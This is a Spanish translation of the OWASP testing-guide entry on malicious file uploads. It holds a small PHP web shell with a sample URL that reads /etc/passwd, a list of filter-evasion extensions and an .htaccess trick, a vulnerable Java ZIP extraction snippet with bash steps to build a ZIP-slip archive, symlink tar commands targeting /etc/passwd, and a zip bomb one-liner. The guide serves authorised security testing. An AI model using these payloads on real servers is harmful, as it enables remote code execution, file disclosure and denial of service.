# Probar la Subida de Archivos Maliciosos

|ID          |
|------------|
|WSTG-BUSL-09|

## Resumen

Los procesos de negocio de muchas aplicaciones permiten a los usuarios subir datos a ellas. Aunque la validación de entrada se entiende ampliamente para campos de entrada basados en texto, es más complicado de implementar cuando se aceptan archivos. Aunque muchos sitios implementan restricciones simples basadas en una lista de extensiones permitidas (o bloqueadas), esto no es suficiente para prevenir que los atacantes suban tipos de archivo legítimos que tienen contenidos maliciosos.

Las vulnerabilidades relacionadas con la subida de archivos maliciosos son únicas en que estos archivos "maliciosos" pueden ser rechazados fácilmente incluyendo lógica de negocio que escaneará archivos durante el proceso de subida y rechazará aquellos percibidos como maliciosos. Adicionalmente, esto es diferente de subir archivos inesperados en que mientras el tipo de archivo podría ser aceptado el archivo podría todavía ser malicioso para el sistema.

Finalmente, "malicioso" significa diferentes cosas para diferentes sistemas, por ejemplo archivos maliciosos que podrían explotar vulnerabilidades de SQL server podrían no considerarse como "maliciosos" en un entorno usando un almacén de datos NoSQL.

La aplicación podría permitir la subida de archivos maliciosos que incluyen exploits o shellcode sin enviarlos a escaneo de archivos maliciosos. Los archivos maliciosos podrían ser detectados y detenidos en varios puntos de la arquitectura de la aplicación tales como: Sistema de Detección/Prevención de Intrusos, software antivirus del servidor de aplicaciones o escaneo antivirus por aplicación a medida que se suben los archivos (quizás descargando el escaneo usando SCAP).

### Ejemplo

Un ejemplo común de esta vulnerabilidad es una aplicación tal como un blog o foro que permite a los usuarios subir imágenes y otros archivos multimedia. Mientras estos se consideran seguros, si un atacante es capaz de subir código ejecutable (tal como un script PHP), esto podría permitirles ejecutar comandos del sistema operativo, leer y modificar información en el sistema de archivos, acceder a la base de datos backend y comprometer completamente el servidor.

## Objetivos de Prueba

- Identificar la funcionalidad de subida de archivos.
- Revisar la documentación del proyecto para identificar qué tipos de archivo se consideran aceptables, y qué tipos se considerarían peligrosos o maliciosos.
    - Si la documentación no está disponible entonces considerar qué sería apropiado basado en el propósito de la aplicación.
- Determinar cómo se procesan los archivos subidos.
- Obtener o crear un conjunto de archivos maliciosos para pruebas.
- Intentar subir los archivos maliciosos a la aplicación y determinar si se acepta y procesa.

## Cómo Probar

### Tipos de Archivos Maliciosos

Las verificaciones más simples que una aplicación puede hacer son determinar que solo tipos confiables de archivos puedan ser subidos.

#### Web Shells

Si el servidor está configurado para ejecutar código, entonces podría ser posible obtener ejecución de comandos en el servidor subiendo un archivo conocido como un web shell, el cual permite ejecutar código arbitrario o comandos del sistema operativo. Para que este ataque sea exitoso, el archivo necesita ser subido dentro del webroot, y el servidor debe estar configurado para ejecutar el código.

Subir este tipo de shell en un servidor expuesto a internet es peligroso, porque permite a cualquiera que sepa (o adivine) la ubicación del shell ejecutar código en el servidor. Varias técnicas pueden ser usadas para proteger el shell de acceso no autorizado, tales como:

- Subir el shell con un nombre generado aleatoriamente.
- Proteger con contraseña el shell.
- Implementar restricciones basadas en IP en el shell.

**Recordar remover el shell cuando se haya terminado.**

El ejemplo a continuación muestra un shell simple basado en PHP, que ejecuta comandos del sistema operativo pasados a él en un parámetro GET, y solo puede ser accedido desde una dirección IP específica:

```php
<?php
    if ($_SERVER['REMOTE_HOST'] === "FIXME") { // Establecer tu dirección IP aquí
        if(isset($_REQUEST['cmd'])){
            $cmd = ($_REQUEST['cmd']);
            echo "<pre>\n";
            system($cmd);
            echo "</pre>";
        }
    }
?>
```

Una vez que el shell se sube (con un nombre aleatorio), se pueden ejecutar comandos del sistema operativo pasándolos en el parámetro GET `cmd`:

`https://example.org/7sna8uuorvcx3x4fx.php?cmd=cat+/etc/passwd`

#### Evasión de Filtros

El primer paso es determinar qué filtros están permitiendo o bloqueando, y dónde están implementados. Si las restricciones se realizan del lado del cliente usando JavaScript, entonces pueden ser evadidas trivialmente con un proxy de intercepción.

Si el filtrado se realiza del lado del servidor, entonces se pueden intentar varias técnicas para evadirlo, incluyendo:

- Cambiar el valor de `Content-Type` como `image/jpeg` en la solicitud HTTP.
- Cambiar las extensiones a una extensión menos común, tal como `file.php5`, `file.shtml`, `file.asa`, `file.jsp`, `file.jspx`, `file.aspx`, `file.asp`, `file.phtml`, `file.cshtml`
- Usar extensiones dobles tales como `file.jpg.php` o `file.png.php`. Para que esto funcione apropiadamente, primero se debe entender cómo el servidor web maneja archivos con múltiples extensiones. Por ejemplo, en cierto escenario, el servidor web podría solo verificar si `.jpg` o `.png` es parte de la extensión del archivo lo cual podría permitir a los atacantes evadir el filtro de extensión de archivo.
- Cambiar la [firma de archivo](https://en.wikipedia.org/wiki/List_of_file_signatures) o magic byte del archivo subido.
- Cambiar la capitalización de la extensión, tal como `file.PhP` o `file.AspX`
- Si la solicitud incluye múltiples nombres de archivo, cambiarlos a diferentes valores.
- Usar caracteres especiales trailing tales como espacios, puntos o caracteres null tales como `file.asp...`, `file.php;jpg`, `file.asp%00.jpg`, `1.jpg%00.php`
- En versiones mal configuradas de Nginx, subir un archivo como `test.jpg/x.php` podría permitir que se ejecute como `x.php`.
- Subir un archivo `.htaccess` con el siguiente contenido: `AddType application/x-httpd-php .png`. Esto causará que el servidor Apache ejecute imágenes `.png` como si fueran recursos `.php`.

En algunas situaciones, se podría necesitar combinar las diferentes técnicas de evasión de filtros discutidas anteriormente para evadir exitosamente los filtros del lado del servidor.

### Contenidos de Archivos Maliciosos

Una vez que el tipo de archivo se ha validado, es importante también asegurar que los contenidos del archivo sean seguros. Esto es significativamente más difícil de hacer, ya que los pasos requeridos variarán dependiendo de los tipos de archivo que estén permitidos.

#### Malware

Las aplicaciones generalmente deberían escanear archivos subidos con software anti-malware para asegurar que no contengan nada malicioso. La forma más fácil de probar esto es usar el [archivo de prueba EICAR](https://www.eicar.org/download-anti-malware-testfile/), que es un archivo seguro que se marca como malicioso por todo software anti-malware.

Dependiendo del tipo de aplicación, podría ser necesario probar otros tipos de archivos peligrosos, tales como documentos de Office que contienen macros maliciosas. Herramientas tales como el [Metasploit Framework](https://github.com/rapid7/metasploit-framework) y el [Social Engineer Toolkit (SET)](https://github.com/trustedsec/social-engineer-toolkit) pueden ser usadas para generar archivos maliciosos para varios formatos.

Cuando este archivo se sube, debería ser detectado y puesto en cuarentena o eliminado por la aplicación. Dependiendo de cómo la aplicación procese el archivo, podría no ser obvio si esto ha tenido lugar.

#### Directory Traversal en Archivos

Si la aplicación extrae archivos comprimidos (tales como archivos ZIP), entonces podría ser posible escribir a ubicaciones no previstas usando directory traversal. Esto puede ser explotado subiendo un archivo ZIP malicioso que contiene rutas que atraviesan el sistema de archivos usando secuencias tales como `..\..\..\..\shell.php`. Esta técnica se discute más adelante en el [aviso de snyk](https://snyk.io/research/zip-slip-vulnerability).

Una prueba contra Directory Traversal en Archivos debería incluir dos partes:

1. Un archivo malicioso que se sale del directorio objetivo cuando se extrae. Este archivo malicioso debería contener dos archivos: un archivo `base`, extraído en el directorio objetivo, y un archivo `traversed` que intenta navegar arriba en el árbol de directorios para alcanzar la carpeta raíz - añadiendo un archivo al directorio `tmp`. Una ruta maliciosa contendrá muchos niveles de `../` (*i.e.* `../../../../../../../../tmp/traversed`) para tener mejor oportunidad de alcanzar el directorio raíz. Una vez que el ataque es exitoso, el tester puede encontrar `/tmp/traversed` creado en el servidor web a través del ataque ZIP slip.
2. Lógica que extrae archivos comprimidos ya sea usando código personalizado o una biblioteca. Las vulnerabilidades de Directory Traversal en Archivos existen cuando la funcionalidad de extracción no valida rutas de archivo en el archivo. El ejemplo a continuación muestra una implementación vulnerable en Java:

```java
Enumeration<ZipEntry> entries =​ ​zip​.g​etEntries();

while(entries​.h​asMoreElements()){
    ZipEntry e ​= ​entries.nextElement();
    File f = new File(destinationDir, e.getName());
    InputStream input = zip​.g​etInputStream(e);
    IOUtils​.c​opy(input, write(f));
}
```

Seguir los pasos a continuación para crear un archivo ZIP que pueda abusar del código vulnerable anterior una vez que se suba al servidor web:

```bash
# Abrir una nueva terminal y crear una estructura de árbol
# (podrían ser requeridos más niveles de directorio basado en el sistema siendo objetivo)
mkdir -p a/b/c
# Crear un archivo base
echo 'base' > a/b/c/base
# Crear un archivo traversed
echo 'traversed' > traversed
# Se puede verificar la estructura de árbol usando `tree` en esta etapa
# Navegar al directorio raíz a/b/c
cd a/b/c
# Comprimir los archivos
zip test.zip base ../../../traversed
# Verificar contenido de archivos comprimidos
unzip -l test.zip
```

#### Ataques de Symlink en Archivos

Si la aplicación extrae archivos comprimidos (tales como ZIP o TAR), es importante verificar cómo se manejan los enlaces simbólicos contenidos dentro del archivo. A diferencia del Directory Traversal en Archivos (ZIP Slip), esta técnica no depende de secuencias de path traversal `../`.

Un atacante puede diseñar un archivo que contenga un enlace simbólico que apunta a un archivo sensible en el servidor (por ejemplo `/etc/passwd`). Si el proceso de extracción preserva enlaces simbólicos sin validación, y la aplicación posteriormente procesa o expone los archivos extraídos, esto podría resultar en acceso no previsto a archivos sensibles del sistema.

Por ejemplo, un archivo malicioso podría contener: `link.txt -> /etc/passwd`

Si el backend extrae este archivo sin validar o rechazar enlaces simbólicos, y la aplicación lee `link.txt`, podría divulgar inadvertidamente los contenidos de `/etc/passwd`.

##### Cómo Probar

1. Crear un enlace simbólico: `ln -s /etc/passwd link.txt`
1. Crear un archivo: `tar -czf malicious.tar.gz link.txt`
1. Subir el archivo a la aplicación.
1. Verificar:
   - ¿Se extrae el enlace simbólico?
   - ¿Sigue la aplicación el enlace?
   - ¿Se pueden acceder contenidos de archivos sensibles?

##### Impacto

- Lectura arbitraria de archivos
- Divulgación de información sensible

#### Bombas ZIP

Una [bomba ZIP](https://en.wikipedia.org/wiki/zip_bomb) (más generalmente conocida como bomba de descompresión) es un archivo que contiene un gran volumen de datos. Está destinado a causar una denegación de servicio agotando el espacio en disco o memoria del sistema objetivo que intenta extraer el archivo. Aunque el formato ZIP es el ejemplo más usado para esto, otros formatos también están afectados, incluyendo gzip (que se usa frecuentemente para comprimir datos en tránsito).

En su nivel más simple, una bomba ZIP puede ser creada comprimiendo un archivo grande que consiste en un solo carácter. El ejemplo a continuación muestra cómo crear un archivo de 1MB que se descomprimirá a 1GB:

```bash
dd if=/dev/zero bs=1M count=1024 | zip -9 > bomb.zip
```

Hay varios métodos que pueden ser usados para lograr relaciones de compresión mucho más altas, incluyendo múltiples niveles de compresión, [abusar del formato ZIP](https://www.bamsoftware.com/hacks/zipbomb/) y [quines](https://research.swtch.com/zip) (que son archivos que contienen una copia de sí mismos, causando recursión infinita).

Un ataque de bomba ZIP exitoso resultará en una denegación de servicio, y también puede llevar a costos aumentados si se usa una plataforma de nube auto-escalable. **No llevar a cabo este tipo de ataque a menos que se hayan considerado estos riesgos y se tenga aprobación escrita para hacerlo.**

#### Archivos XML

Los archivos XML tienen varias vulnerabilidades potenciales tales como XML eXternal Entities (XXE) y ataques de denegación de servicio tales como el [ataque de las mil millones de risas](https://en.wikipedia.org/wiki/Billion_laughs_attack).

Estos se discuten más adelante en la guía de [Pruebas de Inyección XML](../07-Input_Validation_Testing/07-Testing_for_XML_Injection.md).

#### Otros Formatos de Archivo

Muchos otros formatos de archivo también tienen preocupaciones de seguridad específicas que necesitan ser tomadas en cuenta, tales como:

- Los archivos de imagen deben verificarse por tamaño máximo de pixel/frame.
- Los archivos CSV podrían permitir [ataques de inyección CSV](https://owasp.org/www-community/attacks/CSV_Injection).
- Los archivos de Office podrían contener macros maliciosas o código PowerShell.
- Los PDFs podrían contener JavaScript malicioso.

Los formatos de archivo permitidos deberían ser revisados cuidadosamente en busca de funcionalidad potencialmente peligrosa, y donde sea posible se deberían hacer intentos para explotar esto durante las pruebas.

### Revisión de Código Fuente

Cuando hay soporte para la característica de subida de archivos, las siguientes APIs/métodos son comunes de encontrar en el código fuente.

- Java: `new file`, `import`, `upload`, `getFileName`, `Download`, `getOutputString`
- C/C++: `open`, `fopen`
- PHP: `move_uploaded_file()`, `Readfile`, `file_put_contents()`, `file()`, `parse_ini_file()`, `copy()`, `fopen()`, `include()`, `require()`

## Casos de Prueba Relacionados

- [Pruebas de Manejo de Extensiones de Archivo para Información Sensible](../02-Configuration_and_Deployment_Management_Testing/03-Test_File_Extensions_Handling_for_Sensitive_Information.md)
- [Pruebas de Inyección XML](../07-Input_Validation_Testing/07-Testing_for_XML_Injection.md)
- [Probar la Subida de Tipos de Archivo Inesperados](08-Test_Upload_of_Unexpected_File_Types.md)

## Remediación

Proteger completamente contra subida de archivos maliciosos puede ser complejo, y los pasos exactos requeridos variarán dependiendo de los tipos de archivos que se suben, y cómo los archivos se procesan o analizan en el servidor. Esto se discute más completamente en la [Hoja de Referencia de Subida de Archivos](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html).

## Herramientas

- Funcionalidad de generación de payloads de Metasploit
- Proxy de intercepción

## Referencias

- [OWASP - File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [OWASP - Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [Why File Upload Forms are a Major Security Threat](https://www.acunetix.com/websitesecurity/upload-forms-threat/)
- [8 Basic Rules to Implement Secure File Uploads](https://software-security.sans.org/blog/2009/12/28/8-basic-rules-to-implement-secure-file-uploads)
- [Stop people uploading malicious PHP files via forms](https://stackoverflow.com/questions/602539/stop-people-uploading-malicious-php-files-via-forms)
- [How to Tell if a File is Malicious](https://web.archive.org/web/20210710090809/https://www.techsupportalert.com/content/how-tell-if-file-malicious.htm)
- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
- [Implementing Secure File Upload](https://infosecauditor.wordpress.com/tag/malicious-file-upload/)
- [Metasploit Generating Payloads](https://www.offensive-security.com/metasploit-unleashed/Generating_Payloads)
- [List of file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)
